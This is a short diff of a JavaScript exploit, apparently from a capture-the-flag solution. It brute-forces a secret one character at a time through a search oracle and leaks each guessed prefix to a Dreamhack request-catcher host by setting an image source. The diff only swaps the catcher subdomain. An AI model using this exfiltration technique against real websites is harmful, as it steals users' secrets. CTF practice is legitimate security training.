@@ -33,11 +33,12 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://ggwnbav.request.dreamhack.games/${secret}`;
+                    img.src = `https://umqjuer.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
         }
     }
+
     exploit();
 </script>
